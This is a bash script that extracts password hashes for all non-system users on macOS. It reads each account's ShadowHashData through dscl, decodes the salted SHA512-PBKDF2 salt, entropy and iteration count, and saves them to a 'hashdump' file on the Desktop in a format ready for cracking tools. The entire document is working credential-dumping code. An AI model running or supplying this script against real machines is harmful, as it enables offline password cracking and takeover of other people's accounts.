#!/bin/bash

# This script attempts to extract password hashes for all users on macOS
# Output is saved to a single file called hashdump on the current user's Desktop

# Get current user and desktop path
CURRENT_USER=$(whoami)
DESKTOP_PATH="/Users/$CURRENT_USER/Desktop"
OUTPUT_FILE="$DESKTOP_PATH/hashdump"

echo "MacOS User Hash Extractor" | tee "$OUTPUT_FILE"
echo "Output file: $OUTPUT_FILE" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Get list of all users (excluding system users)
USERS=$(dscl . -list /Users | grep -vE '^_|daemon|nobody|root|Guest')

extract_user_hash() {
    local USER=$1
    
    echo "[*] Processing user: $USER" | tee -a "$OUTPUT_FILE"
    
    # Try to extract plist data
    PLIST_DATA=$(dscl . -read "/Users/$USER" dsAttrTypeNative:ShadowHashData 2>/dev/null)
    
    if [ -z "$PLIST_DATA" ]; then
        echo "  Could not retrieve password data for user $USER" | tee -a "$OUTPUT_FILE"
        echo "  (This typically requires root access for other users)" | tee -a "$OUTPUT_FILE"
        echo "" | tee -a "$OUTPUT_FILE"
        return 1
    fi
    
    # Convert to XML format
    XML_DATA=$(echo "$PLIST_DATA" | tail -n 1 | xxd -p -r | plutil -convert xml1 - -o - 2>/dev/null)
    
    if [ $? -ne 0 ]; then
        echo "  Failed to convert plist data for $USER" | tee -a "$OUTPUT_FILE"
        echo "" | tee -a "$OUTPUT_FILE"
        return 1
    fi

    # Extract hash components
    INTEGER_VALUE=$(echo "$XML_DATA" | xmllint --xpath '//key[text()="SALTED-SHA512-PBKDF2"]/following-sibling::dict[1]/key[text()="iterations"]/following-sibling::integer[1]/text()' - 2>/dev/null)
    
    HASH_SECOND_DATA_BLOCK=$(echo "$XML_DATA" | xmllint --xpath '//key[text()="SALTED-SHA512-PBKDF2"]/following-sibling::dict[1]/key[text()="salt"]/following-sibling::data[1]/text()' - 2>/dev/null | 
                            awk '{$1=$1};1' | tr -d '\n' | base64 -d | xxd -p -c 256)
    
    HASH_FIRST_DATA_BLOCK=$(echo "$XML_DATA" | xmllint --xpath '//key[text()="SALTED-SHA512-PBKDF2"]/following-sibling::dict[1]/key[text()="entropy"]/following-sibling::data[1]/text()' - 2>/dev/null | 
                           base64 -d | xxd -p -c 256)

    # Verify we got all components
    if [ -z "$INTEGER_VALUE" ] || [ -z "$HASH_SECOND_DATA_BLOCK" ] || [ -z "$HASH_FIRST_DATA_BLOCK" ]; then
        echo "  Failed to extract all hash components for $USER" | tee -a "$OUTPUT_FILE"
        echo "" | tee -a "$OUTPUT_FILE"
        return 1
    fi

    # Format the hash
    USER_HASH="\$ml\$$INTEGER_VALUE\$$HASH_SECOND_DATA_BLOCK\$$HASH_FIRST_DATA_BLOCK"
    
    # Save to file
    echo "Username: $USER" >> "$OUTPUT_FILE"
    echo "Hash: $USER_HASH" >> "$OUTPUT_FILE"
    echo "" >> "$OUTPUT_FILE"
    
    echo "  Successfully extracted hash for $USER" | tee -a "$OUTPUT_FILE"
    echo "" | tee -a "$OUTPUT_FILE"
}

# Clear the output file if it exists
> "$OUTPUT_FILE"

# Process all users
for USER in $USERS; do
    extract_user_hash "$USER"
done

echo "Processing complete. Results saved to: $OUTPUT_FILE" | tee -a "$OUTPUT_FILE"
